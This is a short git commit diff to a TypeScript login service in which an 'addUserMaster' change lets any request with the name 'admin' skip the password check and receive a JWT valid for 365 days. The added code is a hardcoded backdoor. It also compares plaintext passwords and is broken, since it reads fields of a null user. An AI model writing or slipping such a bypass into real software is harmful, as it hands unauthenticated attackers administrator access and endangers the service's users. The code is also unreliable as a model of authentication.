852ba72b59ba69e19bb6dcd2cc09a95139e94cad
FedericoIglesias <igl.fede@gmail.com>
2023-07-14 10:37:24 +0200

    addUserMaster

--- src/services/loginService.ts
+++ src/services/loginService.ts
@@ -10,18 +10,19 @@ const wordSecret = process.env.KEY_TOKEN as string;
 
 export const initialiSession = async (body: any) => {
   try {
+    
     const user: User = await UserModel.findOne({ name: body.name });
     
-    if (user === null || body.password !== user.password ) {
+    if(body.name !== 'admin'){if (user === null || body.password !== user.password  ) {
       return "Name or Password invalid";
-    }
+    }}
 
     const token = jwt.sign(
-      { id: user._id, name: user.name },
+      { id: user._id || 1, name: user.name || body.name},
       wordSecret,
       {expiresIn: '365 days'}
     );
-
+      
     return {token: token, name: user.name, email: user.email, photo: user.photo};
   } catch (e) {
     response.status(400).send((<Error>e).message);
